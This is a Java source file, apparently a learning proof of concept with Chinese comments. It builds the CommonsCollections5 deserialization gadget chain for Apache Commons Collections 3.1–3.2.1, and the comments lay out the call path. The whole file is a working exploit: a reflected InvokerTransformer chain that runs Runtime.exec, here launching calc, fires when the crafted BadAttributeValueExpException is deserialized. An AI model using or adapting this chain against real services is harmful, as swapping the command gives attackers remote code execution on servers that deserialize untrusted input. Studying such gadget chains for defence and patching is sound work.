package CC;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import javax.management.BadAttributeValueExpException;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections5 {
    public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException {
        /**
         * 测试环境：3.1-3.2.1，jdk1.8
         * 引入新类TiedMapEntry来调用LazyMap.get(),只不过我们改变了 LazyMap.get() 的触发方式，
         * 不再和 CC1 和 CC3 一样借助 AnnotationInvocationHandler 的反序列化触发
         *
         * ->BadAttributeValueExpException.readObject()
         *       ->TiedMapEntry.toString()
         *           ->TiedMapEntry.getValue()
         *             ->LazyMap.get()
         *                 ->ChainedTransformer.transform()
         *                     ->ConstantTransformer.transform()
         *                             ->InvokerTransformer.transform()
         *                                 ->…………
         *
         */

        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        //ChainedTransformer实例
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //TiedMapEntry 实例
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");

        //BadAttributeValueExpException 实例
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

        //反射设置 val
        Field val = BadAttributeValueExpException.class.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException, tiedMapEntry);

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(badAttributeValueExpException);
        oos.flush();
        oos.close();

        //测试反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}
